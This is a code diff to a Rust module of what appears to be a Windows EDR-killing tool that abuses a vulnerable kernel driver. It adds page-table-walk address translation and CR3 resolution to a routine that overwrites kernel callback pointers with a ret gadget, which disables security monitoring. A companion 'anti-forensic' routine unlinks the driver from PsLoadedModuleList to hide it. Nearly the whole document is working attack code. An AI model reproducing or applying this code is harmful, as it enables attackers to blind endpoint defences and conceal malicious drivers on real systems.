@@ -22,6 +22,7 @@
 
 use super::deploy::{self, DeployedDriver};
 use super::discover::{CallbackInfo, CallbackListType, ScanResult};
+use super::driver_db::VulnerableDriver;
 use anyhow::{bail, Context, Result};
 use once_cell::sync::Lazy;
 use serde::{Deserialize, Serialize};
@@ -42,6 +43,228 @@ pub struct CallbackBackup {
 
 /// Global backup storage for restore capability.
 static BACKUPS: Lazy<Mutex<Vec<CallbackBackup>>> = Lazy::new(|| Mutex::new(Vec::new()));
+
+//---------------------------------------------------------------------------
+// Virtual-to-Physical address translation
+//---------------------------------------------------------------------------
+
+/// Perform a 4-level x64 page-table walk to translate a virtual address
+/// to a physical address.
+///
+/// The walk traverses PML4 → PDPT → PD → PT → physical page.
+/// Each level uses 9 bits of the virtual address as an index into the
+/// current page-table page.  The entry's bits 12..51 give the next-level
+/// physical page frame number (PFN).
+///
+/// # Arguments
+/// * `driver`         — The vulnerable driver in use.
+/// * `device_handle`  — Open handle to the driver's device.
+/// * `cr3`            — Physical address of the PML4 root (from CR3 /
+///                       DirectoryTableBase).  Only bits 12..51 are used.
+/// * `virtual_address`— The virtual address to translate.
+///
+/// # Returns
+/// The corresponding physical address on success.
+fn translate_va_to_pa(
+    driver: &VulnerableDriver,
+    device_handle: usize,
+    cr3: u64,
+    virtual_address: u64,
+) -> Result<u64> {
+    // x64 virtual address layout (4-level paging):
+    //   [63:48] sign extension (must match bit 47)
+    //   [47:39] PML4 index   (9 bits)
+    //   [38:30] PDPT index   (9 bits)
+    //   [29:21] PD index     (9 bits)
+    //   [20:12] PT index     (9 bits)
+    //   [11: 0] page offset  (12 bits)
+
+    let pml4_idx = (virtual_address >> 39) & 0x1FF;
+    let pdpt_idx = (virtual_address >> 30) & 0x1FF;
+    let pd_idx   = (virtual_address >> 21) & 0x1FF;
+    let pt_idx   = (virtual_address >> 12) & 0x1FF;
+    let offset   = virtual_address & 0xFFF;
+
+    // Mask to extract PFN from a page-table entry (bits 12..51).
+    const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
+    // Present bit.
+    const PTE_PRESENT: u64 = 1;
+    // Large page bit (PS — bit 7).  When set at PD level → 2 MB page;
+    // at PDPT level → 1 GB page.  No further walk needed.
+    const PTE_PS: u64 = 1 << 7;
+
+    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
+        let mut buf = [0u8; 8];
+        // We must use physical addresses for the page-table walk itself.
+        // deploy::read_physical_memory is safe here because page-table
+        // pages are always at physical addresses.
+        unsafe {
+            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
+        }
+        Ok(u64::from_le_bytes(buf))
+    };
+
+    // Level 1 — PML4
+    let pml4_base = cr3 & PFN_MASK;
+    let pml4e = read_entry(pml4_base, pml4_idx)?;
+    if pml4e & PTE_PRESENT == 0 {
+        bail!(
+            "PML4E not present for VA 0x{:016X} (PML4 base 0x{:016X}, idx {})",
+            virtual_address, pml4_base, pml4_idx
+        );
+    }
+
+    // Level 2 — PDPT
+    let pdpt_base = pml4e & PFN_MASK;
+    let pdpte = read_entry(pdpt_base, pdpt_idx)?;
+    if pdpte & PTE_PRESENT == 0 {
+        bail!(
+            "PDPTE not present for VA 0x{:016X} (PDPT base 0x{:016X}, idx {})",
+            virtual_address, pdpt_base, pdpt_idx
+        );
+    }
+    // 1 GB large page
+    if pdpte & PTE_PS != 0 {
+        let phys = (pdpte & 0x000F_FFFF_C000_0000) + (virtual_address & 0x3FFF_FFFF);
+        return Ok(phys);
+    }
+
+    // Level 3 — PD
+    let pd_base = pdpte & PFN_MASK;
+    let pde = read_entry(pd_base, pd_idx)?;
+    if pde & PTE_PRESENT == 0 {
+        bail!(
+            "PDE not present for VA 0x{:016X} (PD base 0x{:016X}, idx {})",
+            virtual_address, pd_base, pd_idx
+        );
+    }
+    // 2 MB large page
+    if pde & PTE_PS != 0 {
+        let phys = (pde & 0x000F_FFFF_FFE0_0000) + (virtual_address & 0x1F_FFFF);
+        return Ok(phys);
+    }
+
+    // Level 4 — PT
+    let pt_base = pde & PFN_MASK;
+    let pte = read_entry(pt_base, pt_idx)?;
+    if pte & PTE_PRESENT == 0 {
+        bail!(
+            "PTE not present for VA 0x{:016X} (PT base 0x{:016X}, idx {})",
+            virtual_address, pt_base, pt_idx
+        );
+    }
+
+    let phys_page = pte & PFN_MASK;
+    Ok(phys_page + offset)
+}
+
+/// Resolve CR3 (DirectoryTableBase) by reading the initial system process.
+///
+/// On x64 Windows the kernel shares a single page-table root (CR3) for all
+/// processes via the _KPROCESS.DirectoryTableBase field.  We resolve
+/// `PsInitialSystemProcess`, read the _EPROCESS, and extract the value at
+/// offset +0x28 (DirectoryTableBase in _KPROCESS, which is the first embedded
+/// struct in _EPROCESS).
+fn resolve_cr3(
+    driver: &VulnerableDriver,
+    device_handle: usize,
+    kernel_base: u64,
+) -> Result<u64> {
+    // Resolve PsInitialSystemProcess — points to the initial _EPROCESS.
+    let eprocess = super::discover::resolve_kernel_symbol(
+        driver,
+        device_handle,
+        kernel_base,
+        "PsInitialSystemProcess",
+    )
+    .context("failed to resolve PsInitialSystemProcess")?;
+
+    // PsInitialSystemProcess is a pointer to _EPROCESS.  Read the pointer.
+    let mut ptr_buf = [0u8; 8];
+    // This first read is a kernel virtual address.  Most drivers handle
+    // VA fine (MmMapIoSpace), so we use the raw address.  If the driver
+    // needs physical addresses, we have a chicken-and-egg problem: we
+    // need CR3 to translate, but we need to read to get CR3.  The
+    // solution is that PsInitialSystemProcess lives in the kernel's
+    // .data section which is mapped 1:1 via the HAL identity mapping
+    // (MmGetPhysicalAddress works even without our translation).
+    unsafe {
+        deploy::read_physical_memory(driver, device_handle, eprocess, &mut ptr_buf)?;
+    }
+    let eprocess_addr = u64::from_le_bytes(ptr_buf);
+
+    if eprocess_addr == 0 {
+        bail!("PsInitialSystemProcess is NULL");
+    }
+
+    // _KPROCESS is embedded at the start of _EPROCESS.
+    // DirectoryTableBase is at _KPROCESS + 0x28 on modern x64 Windows.
+    // (Verified across Windows 10 1607–22H2 and Windows 11.)
+    const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
+    let mut cr3_buf = [0u8; 8];
+    unsafe {
+        deploy::read_physical_memory(
+            driver,
+            device_handle,
+            eprocess_addr + DIRECTORY_TABLE_BASE_OFFSET,
+            &mut cr3_buf,
+        )?;
+    }
+    let cr3 = u64::from_le_bytes(cr3_buf);
+
+    if cr3 == 0 || cr3 & 0xFFF != 0 {
+        bail!("Invalid CR3 value read from DirectoryTableBase: 0x{:016X}", cr3);
+    }
+
+    log::info!("Resolved CR3 from PsInitialSystemProcess: 0x{:016X}", cr3);
+    Ok(cr3)
+}
+
+/// Read kernel virtual memory, automatically translating VA→PA when the
+/// driver requires physical addresses.
+///
+/// # Safety
+/// Caller must ensure the address range is valid kernel memory.
+unsafe fn read_kernel_memory(
+    driver: &VulnerableDriver,
+    device_handle: usize,
+    cr3: Option<u64>,
+    virtual_address: u64,
+    buffer: &mut [u8],
+) -> Result<()> {
+    if driver.needs_physical_addr {
+        let cr3_val = cr3.context(
+            "CR3 required for VA→PA translation with this driver",
+        )?;
+        let phys = translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
+        deploy::read_physical_memory(driver, device_handle, phys, buffer)
+    } else {
+        deploy::read_physical_memory(driver, device_handle, virtual_address, buffer)
+    }
+}
+
+/// Write kernel virtual memory, automatically translating VA→PA when the
+/// driver requires physical addresses.
+///
+/// # Safety
+/// Caller must ensure the address range is valid kernel memory.
+unsafe fn write_kernel_memory(
+    driver: &VulnerableDriver,
+    device_handle: usize,
+    cr3: Option<u64>,
+    virtual_address: u64,
+    data: &[u8],
+) -> Result<()> {
+    if driver.needs_physical_addr {
+        let cr3_val = cr3.context(
+            "CR3 required for VA→PA translation with this driver",
+        )?;
+        let phys = translate_va_to_pa(driver, device_handle, cr3_val, virtual_address)?;
+        deploy::write_physical_memory(driver, device_handle, phys, data)
+    } else {
+        deploy::write_physical_memory(driver, device_handle, virtual_address, data)
+    }
+}
 
 /// Result of a callback nuke operation.
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -77,9 +300,10 @@ pub struct RestoreResult {
 /// Falls back to scanning the .text section for any `ret` instruction
 /// if the export cannot be resolved.
 fn find_ret_address(
-    driver: &super::driver_db::VulnerableDriver,
+    driver: &VulnerableDriver,
     device_handle: usize,
     kernel_base: u64,
+    cr3: Option<u64>,
 ) -> Result<u64> {
     // Method 1: Resolve IoInvalidDeviceRequest export.
     // This function is literally just `ret` and is present in all Windows versions.
@@ -93,7 +317,7 @@ fn find_ret_address(
             // Verify it's actually a ret instruction.
             let mut buf = [0u8; 1];
             match unsafe {
-                deploy::read_physical_memory(driver, device_handle, addr, &mut buf)
+                read_kernel_memory(driver, device_handle, cr3, addr, &mut buf)
             } {
                 Ok(()) if buf[0] == 0xC3 => {
                     log::info!(
@@ -129,14 +353,14 @@ fn find_ret_address(
     // Read PE headers to find .text section.
     let mut dos_header = [0u8; 64];
     unsafe {
-        deploy::read_physical_memory(driver, device_handle, kernel_base, &mut dos_header)?;
+        read_kernel_memory(driver, device_handle, cr3, kernel_base, &mut dos_header)?;
     }
 
     let pe_offset = u32::from_le_bytes(dos_header[0x3C..0x40].try_into()?) as u64;
 
     let mut pe_sig = [0u8; 4];
     unsafe {
-        deploy::read_physical_memory(driver, device_handle, kernel_base + pe_offset, &mut pe_sig)?;
+        read_kernel_memory(driver, device_handle, cr3, kernel_base + pe_offset, &mut pe_sig)?;
     }
 
     if &pe_sig != b"PE\0\0" {
@@ -146,9 +370,10 @@ fn find_ret_address(
     // Read section count and optional header size.
     let mut coff_buf = [0u8; 20];
     unsafe {
-        deploy::read_physical_memory(
+        read_kernel_memory(
             driver,
             device_handle,
+            cr3,
             kernel_base + pe_offset + 4,
             &mut coff_buf,
         )?;
@@ -164,9 +389,10 @@ fn find_ret_address(
         let section_offset = sections_offset + (i as u64) * 40;
         let mut section_header = [0u8; 40];
         unsafe {
-            deploy::read_physical_memory(
+            read_kernel_memory(
                 driver,
                 device_handle,
+                cr3,
                 kernel_base + section_offset,
                 &mut section_header,
             )?;
@@ -188,9 +414,10 @@ fn find_ret_address(
         let scan_size = std::cmp::min(4096u64, virtual_size);
         let mut scan_buf = vec![0u8; scan_size as usize];
         unsafe {
-            deploy::read_physical_memory(
+            read_kernel_memory(
                 driver,
                 device_handle,
+                cr3,
                 kernel_base + virtual_address,
                 &mut scan_buf,
             )?;
@@ -234,16 +461,18 @@ fn find_ret_address(
 ///
 /// Returns `Ok(original_value)` on success.
 unsafe fn overwrite_callback(
-    driver: &super::driver_db::VulnerableDriver,
+    driver: &VulnerableDriver,
     device_handle: usize,
     callback: &CallbackInfo,
     ret_address: u64,
+    cr3: Option<u64>,
 ) -> Result<u64> {
     // Read the original function pointer.
     let mut original_buf = [0u8; 8];
-    deploy::read_physical_memory(
+    read_kernel_memory(
         driver,
         device_handle,
+        cr3,
         callback.block_address + 0x18,
         &mut original_buf,
     )
@@ -263,9 +492,10 @@ unsafe fn overwrite_callback(
 
     // Write the ret address.
     let ret_bytes = ret_address.to_le_bytes();
-    deploy::write_physical_memory(
+    write_kernel_memory(
         driver,
         device_handle,
+        cr3,
         callback.block_address + 0x18,
         &ret_bytes,
     )
@@ -324,8 +554,16 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
         });
     }
 
-    // Step 2: Find a ret address.
-    let ret_address = find_ret_address(driver, device_handle, scan.kernel_base)
+    // Step 2: Resolve CR3 if the driver needs physical addresses.
+    let cr3 = if driver.needs_physical_addr {
+        Some(resolve_cr3(driver, device_handle, scan.kernel_base)
+            .context("failed to resolve CR3 for VA→PA translation")?)
+    } else {
+        None
+    };
+
+    // Step 3: Find a ret address.
+    let ret_address = find_ret_address(driver, device_handle, scan.kernel_base, cr3)
         .context("failed to find ret address")?;
 
     log::info!("Using ret address: 0x{:016X}", ret_address);
@@ -356,7 +594,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
             continue;
         }
 
-        match unsafe { overwrite_callback(driver, device_handle, callback, ret_address) } {
+        match unsafe { overwrite_callback(driver, device_handle, callback, ret_address, cr3) } {
             Ok(original_value) => {
                 // Save backup for restore.
                 let backup = CallbackBackup {
@@ -402,7 +640,7 @@ pub fn nuke_callbacks(deployed: &DeployedDriver) -> Result<NukeResult> {
 
     // Step 4: Anti-forensic cleanup — unlink the driver from PsLoadedModuleList.
     if !deployed.was_preloaded {
-        if let Err(e) = unlink_driver_from_list(deployed, scan.kernel_base) {
+        if let Err(e) = unlink_driver_from_list(deployed, scan.kernel_base, cr3) {
             log::warn!("Failed to unlink driver from PsLoadedModuleList: {}", e);
             // Non-fatal — the callbacks are already overwritten.
         }
@@ -427,6 +665,22 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
         .context("No device handle for deployed driver")?;
 
     let driver = deployed.driver;
+
+    // Resolve CR3 if the driver needs physical addresses for write-back.
+    // We need the kernel base to resolve PsInitialSystemProcess; grab it
+    // from a fresh scan.
+    let cr3 = if driver.needs_physical_addr {
+        let scan = super::discover::scan_callbacks(deployed).ok();
+        if let Some(scan) = scan {
+            Some(resolve_cr3(driver, device_handle, scan.kernel_base)
+                .context("failed to resolve CR3 for VA→PA translation")?)
+        } else {
+            bail!("Cannot resolve CR3: callback scan failed during restore");
+        }
+    } else {
+        None
+    };
+
     let mut result = RestoreResult {
         restored: 0,
         failed: 0,
@@ -441,9 +695,10 @@ pub fn restore_callbacks(deployed: &DeployedDriver) -> Result<RestoreResult> {
         // Write the original value back.
         let original_bytes = backup.original_value.to_le_bytes();
         match unsafe {
-            deploy::write_physical_memory(
+            write_kernel_memory(
                 driver,
                 device_handle,
+                cr3,
                 backup.address,
                 &original_bytes,
             )
@@ -494,7 +749,7 @@ pub fn get_backup_snapshot() -> Vec<CallbackBackup> {
 /// loaded module list, making it invisible to tools like `driverquery`
 /// and `EnumDeviceDrivers`. The driver remains loaded in kernel memory
 /// and continues to function.
-fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Result<()> {
+fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64, cr3: Option<u64>) -> Result<()> {
     let device_handle = deployed
         .device_handle
         .context("No device handle")?;
@@ -518,7 +773,7 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
 
     let mut flink_buf = [0u8; 8];
     unsafe {
-        deploy::read_physical_memory(driver, device_handle, list_head, &mut flink_buf)?;
+        read_kernel_memory(driver, device_handle, cr3, list_head, &mut flink_buf)?;
     }
     let mut current = u64::from_le_bytes(flink_buf);
 
@@ -533,9 +788,10 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
         // UNICODE_STRING: Length (u16), MaxLength (u16), Buffer (ptr)
         let mut name_info = [0u8; 16]; // UNICODE_STRING + pointer
         unsafe {
-            deploy::read_physical_memory(
+            read_kernel_memory(
                 driver,
                 device_handle,
+                cr3,
                 current + 0x58,
                 &mut name_info,
             )?;
@@ -547,9 +803,10 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
         if name_length > 0 && name_buffer != 0 {
             let mut name_buf = vec![0u8; name_length + 2];
             unsafe {
-                deploy::read_physical_memory(
+                read_kernel_memory(
                     driver,
                     device_handle,
+                    cr3,
                     name_buffer,
                     &mut name_buf,
                 )?;
@@ -567,9 +824,10 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
                 // Read Flink and Blink of this entry.
                 let mut entry_links = [0u8; 16];
                 unsafe {
-                    deploy::read_physical_memory(
+                    read_kernel_memory(
                         driver,
                         device_handle,
+                        cr3,
                         current,
                         &mut entry_links,
                     )?;
@@ -580,9 +838,10 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
                 // Set blink->Flink = flink.
                 let flink_bytes = entry_flink.to_le_bytes();
                 unsafe {
-                    deploy::write_physical_memory(
+                    write_kernel_memory(
                         driver,
                         device_handle,
+                        cr3,
                         entry_blink,
                         &flink_bytes,
                     )?;
@@ -591,9 +850,10 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
                 // Set flink->Blink = blink.
                 let blink_bytes = entry_blink.to_le_bytes();
                 unsafe {
-                    deploy::write_physical_memory(
+                    write_kernel_memory(
                         driver,
                         device_handle,
+                        cr3,
                         entry_flink + 8,
                         &blink_bytes,
                     )?;
@@ -609,7 +869,7 @@ fn unlink_driver_from_list(deployed: &DeployedDriver, kernel_base: u64) -> Resul
 
         // Follow Flink.
         unsafe {
-            deploy::read_physical_memory(driver, device_handle, current, &mut flink_buf)?;
+            read_kernel_memory(driver, device_handle, cr3, current, &mut flink_buf)?;
         }
         current = u64::from_le_bytes(flink_buf);
     }
